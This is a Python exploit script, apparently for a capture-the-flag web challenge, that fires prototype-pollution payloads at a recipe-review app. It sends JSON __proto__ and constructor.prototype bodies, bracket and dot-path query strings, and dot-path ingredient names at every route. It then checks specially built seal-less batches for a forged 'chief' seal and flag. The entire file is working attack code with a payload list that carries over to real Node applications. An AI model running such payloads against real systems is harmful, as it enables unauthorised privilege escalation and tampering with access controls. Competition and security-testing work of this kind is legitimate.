#!/usr/bin/env python3
"""Prototype pollution, with the oracle that only the jammed batches can give.

The reason every earlier pollution test came back negative is the oracle, not the payload:
those tests created a batch with `__proto__` in the request and then read *that batch's* Seal
cell. A batch built field-by-field has its own `seal: null`, which shadows anything inherited,
and it is stamped standard a few seconds later anyway.

A jammed batch is different and is exactly the object a pollution primitive wants: it is
`reviewed` with **no `seal` property written at all**. If anything in the process ever gains
`Object.prototype.seal === 'chief'` (or the recipe's own prototype gets swapped by an
`Object.assign(target, req.body)` that carries a `__proto__` key), then every seal-less
document suddenly reads `chief`, the recipe page renders `<div class="seal gold">` with the
flag inside, and "only the Chief can award that seal" becomes a bug instead of a promise.

So: hit every input sink with both pollution syntaxes (JSON `__proto__`, qs bracket and dot
paths, `constructor.prototype`, nested, and dot-path ingredient names, since the mixer treats
`name` as a key), and after each one re-read the pages of existing unsealed batches.
"""
import re
import sys
import time

from cc import Client, new_baker

BASE = "https://tomorrow.web.2026.sunshinectf.games"

JAMS = []  # oracles are created below, under our own account

BODIES = [
    ("proto-seal", {"__proto__": {"seal": "chief"}}),
    ("proto-seal-status", {"__proto__": {"seal": "chief", "status": "reviewed"}}),
    ("ctor-proto", {"constructor": {"prototype": {"seal": "chief"}}}),
    ("deep", {"a": {"b": {"__proto__": {"seal": "chief"}}}}),
    ("proto-gold", {"__proto__": {"golden": True, "gold": True, "flag": True}}),
    ("proto-role", {"__proto__": {"role": "chief"}}),
    ("proto-user", {"__proto__": {"user": {"role": "chief"}}}),
]

QUERIES = [
    "?__proto__[seal]=chief",
    "?__proto__.seal=chief",
    "?constructor.prototype.seal=chief",
    "?[__proto__][seal]=chief",
    "?a[b]=c&__proto__[seal]=chief",
    "?__proto__[seal]=chief&__proto__[status]=reviewed",
]

ING_NAMES = ["__proto__.seal", "__proto__[seal]", "constructor.prototype.seal",
             "a.b.__proto__.seal", "seal"]


def log(*a):
    sys.stdout.buffer.write(("[%s] " % time.strftime("%H:%M:%S") + " ".join(str(x) for x in a)
                             + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


ORACLES = []


def check_oracles(c):
    """Any seal-less batch of ours that suddenly renders the golden block wins."""
    for tag, rid in ORACLES:
        code, page, dt = c.get("/recipe/%s" % rid)
        page = str(page)
        g = re.search(r'class="seal gold"[\s\S]{0,600}?class="flag"[^>]*>\s*([^<]+)', page)
        if g or 'class="seal gold"' in page or 'class="flag"' in page:
            open("../files/proto_golden_%s.html" % rid[:8], "w", encoding="utf-8").write(page)
            return rid, (g.group(1).strip() if g else None)
        blk = re.search(r"<tr>(?:(?!</tr>).)*?%s(?:(?!</tr>).)*?</tr>" % rid, c.get("/dashboard")[1] or "", re.S)
        if blk:
            tail = " ".join(re.sub(r"<[^>]+>", " ", blk.group(0).split("</span>")[-1]).split())
            if "&mdash;" not in tail and "standard" not in tail:
                log("   seal cell of %s (%s) is now %r" % (tag, rid[:8], tail[:40]))
    return None, None


u, c, _ = new_baker("pp")
log("attacker account", u)
# oracle 1: a draft that is never submitted (no seal property at all)
code, out, dt = c.post("/api/recipe", {"title": "draft oracle",
                                       "ingredients": [{"name": "flour", "value": "1"}]})
ORACLES.append(("draft", out["id"]))
# oracle 2: a jammed batch - reviewed, and the app never wrote a seal
code, out, dt = c.post("/api/recipe", {"title": "jam oracle",
                                       "ingredients": [{"name": ("j%03d" % i) + "z" * 42,
                                                        "value": "x" * 64} for i in range(175)]})
jamrid = out["id"]
c.post("/api/recipe/%s/submit" % jamrid, {})
time.sleep(20)
code, dash, dt = c.get("/dashboard")
blk = re.search(r"<tr>(?:(?!</tr>).)*?%s(?:(?!</tr>).)*?</tr>" % jamrid, dash or "", re.S)
log("jam oracle settled: %s" % (" ".join(re.sub(r"<[^>]+>", " ", blk.group(0)).split())[:70]
                               if blk else "?"))
ORACLES.append(("jam", jamrid))
log("oracles: %s" % [(t, r[:8]) for t, r in ORACLES])

log("=== A. JSON bodies on the routes that take bodies ===")
for label, extra in BODIES:
    for path in ("/api/recipe", "/api/recipe/%s/submit" % ("0" * 24), "/login", "/register"):
        body = dict(extra)
        if path == "/api/recipe":
            body.update({"title": "pp", "ingredients": [{"name": "flour", "value": "1"}]})
        elif path == "/login":
            body.update({"username": u, "password": "Passw0rd!"})
        elif path == "/register":
            body.update({"username": "ppz%d" % int(time.time() % 10000), "password": "Passw0rd!"})
        code, out, dt = c.post(path, body)
        if code >= 500:
            log("   %-18s %-28s -> %s !!! %s" % (label, path, code, str(out)[:80]))
    rid, got = check_oracles(c)
    if rid:
        log("!!! after %s -> %s flag=%s" % (label, rid, got))
        if got:
            open("flag.txt", "w", encoding="utf-8").write(got + "\n")
            sys.exit(0)
    time.sleep(0.3)

log("=== B. query strings on GET and POST routes ===")
for q in QUERIES:
    for path in ("/dashboard" + q, "/recipe/" + ORACLES[1][1] + q, "/review/" + ORACLES[1][1] + q,
                 "/api/recipe" + q, "/api/seal" + q):
        code, out, dt = c.get(path)
        if code >= 500:
            log("   %-40s -> %s !!! %s" % (path[:40], code, str(out)[:80]))
    code, out, dt = c.post("/api/recipe" + q, {"title": "qpp",
                                               "ingredients": [{"name": "flour", "value": "1"}]})
    rid, got = check_oracles(c)
    if rid:
        log("!!! after %s -> %s flag=%s" % (q, rid, got))
        if got:
            open("flag.txt", "w", encoding="utf-8").write(got + "\n")
            sys.exit(0)
    time.sleep(0.3)

log("=== C. dot-path ingredient names (mixer writes them as cookie names) ===")
for nm in ING_NAMES:
    code, out, dt = c.post("/api/recipe", {"title": "dot " + nm,
                                           "ingredients": [{"name": nm, "value": "chief"},
                                                           {"name": "flour", "value": "1"}]})
    rid2 = out.get("id") if isinstance(out, dict) else None
    if rid2:
        c.post("/api/recipe/%s/submit" % rid2, {})
    rid, got = check_oracles(c)
    if rid:
        log("!!! after ingredient %s -> %s flag=%s" % (nm, rid, got))
        if got:
            open("flag.txt", "w", encoding="utf-8").write(got + "\n")
            sys.exit(0)
    time.sleep(6)

log("=== D. pollution carried inside the jam batch itself ===")
mix = [{"name": "__proto__.seal", "value": "chief"}] + \
      [{"name": ("p%03d" % i) + "z" * 42, "value": "x" * 64} for i in range(150)]
code, out, dt = c.post("/api/recipe", {"title": "proto jam", "ingredients": mix})
rid3 = out["id"]
c.post("/api/recipe/%s/submit" % rid3, {})
log("submitted proto-jam %s" % rid3[:8])
time.sleep(20)
code, page, _ = c.get("/recipe/%s" % rid3)
log("proto-jam page: %s" % ("GOLD" in str(page) or "flag" in str(page),))
rid, got = check_oracles(c)
if rid:
    log("!!! flag=%s" % got)
log("no pollution effect on any unsealed batch")
